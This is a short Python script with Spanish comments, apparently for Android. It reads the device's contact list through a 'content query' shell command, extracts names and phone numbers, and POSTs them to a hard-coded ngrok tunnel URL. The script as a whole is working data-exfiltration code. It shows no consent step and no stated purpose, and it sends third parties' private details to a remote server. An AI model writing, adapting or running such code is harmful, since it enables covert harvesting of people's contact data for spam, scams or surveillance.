import os
import requests

# Función para listar contactos
def listar_contactos():
    # Comando para obtener contactos
    contactos_bruto = os.popen("content query --uri content://contacts/phones").read()
    contactos = []
    
    for linea in contactos_bruto.splitlines():
        if "display_name" in linea and "number" in linea:
            nombre = linea.split("display_name=")[1].split(" ")[0]
            numero = linea.split("number=")[1].split(" ")[0]
            contactos.append({"nombre": nombre, "numero": numero})

    return contactos

# Función principal
def main():
    contactos = listar_contactos()
    url = "https://9493-186-166-142-157.ngrok-free.app/contactos"  # Cambia esta ruta según tu API
    response = requests.post(url, json={"contactos": contactos})

    if response.status_code == 200:
        print("Contactos enviados con éxito.")
    else:
        print("Error al enviar contactos:", response.text)

if __name__ == "__main__":
    main()
